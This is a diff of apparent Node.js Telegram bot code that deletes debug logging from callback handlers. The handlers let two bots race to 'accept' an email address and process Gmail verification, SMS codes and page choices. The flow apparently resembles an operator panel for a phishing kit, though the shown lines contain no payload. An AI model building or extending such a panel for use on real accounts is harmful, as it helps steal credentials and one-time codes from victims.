@@ -163,7 +163,6 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, identifier] = query.data.split("|");
 
-    console.log(`🔘 Bot 1 | ${identifier} | Action: ${action}`);
 
     // ============================================================================
     // ✅ VERIFY_DIGIT HANDLER (Gmail verification)
@@ -428,7 +427,6 @@ bot.on("callback_query", async (query) => {
       botsThatClickedPage1[email] = true;
       botsThatClickedPage1[`${email}_timestamp`] = Date.now();
       
-      console.log(`🏆 User ${email} - Telegram 1 WINS!`);
       
       // Send notification to Bot 2 (loser)
       if (bot2 && ADMIN_CHAT_ID_2) {
@@ -477,7 +475,6 @@ bot.on("callback_query", async (query) => {
 
       // Build status message
       let statusMessage = "";
-      console.log(`📋 Building status message for action: ${action}, email: ${email}`);
       
       if (action === "page1") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
@@ -575,7 +572,6 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> → 🌈`;
       }
 
-      console.log(`📨 Final statusMessage: "${statusMessage}"`);
 
       // ✅ UPDATE STATUS on backend for verification callbacks
       if (action === "verification_accept" || action === "verification_reject") {
@@ -594,7 +590,6 @@ bot.on("callback_query", async (query) => {
       if (statusMessage) {
         try {
           const replyUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-          console.log(`🚀 Sending message to Telegram...`);
           await fetch(replyUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -604,7 +599,6 @@ bot.on("callback_query", async (query) => {
               parse_mode: "HTML"
             })
           });
-          console.log(`✅ Message sent successfully!`);
         } catch (err) {
           console.error(`❌ Failed to send status message:`, err);
         }
@@ -639,7 +633,6 @@ if (bot2) {
     try {
       const [action, identifier] = query.data.split("|");
 
-      console.log(`🔘 Bot 2 | ${identifier} | Action: ${action}`);
 
       let email = identifier;
       let smsCode = "";
@@ -677,7 +670,6 @@ if (bot2) {
         botsThatClickedPage1[email] = true;
         botsThatClickedPage1[`${email}_timestamp`] = Date.now();
         
-        console.log(`🏆 User ${email} - Telegram 2 WINS!`);
         // ✅ NO NOTIFICATION - Only Bot 1 notifies, not Bot 2
       }
 
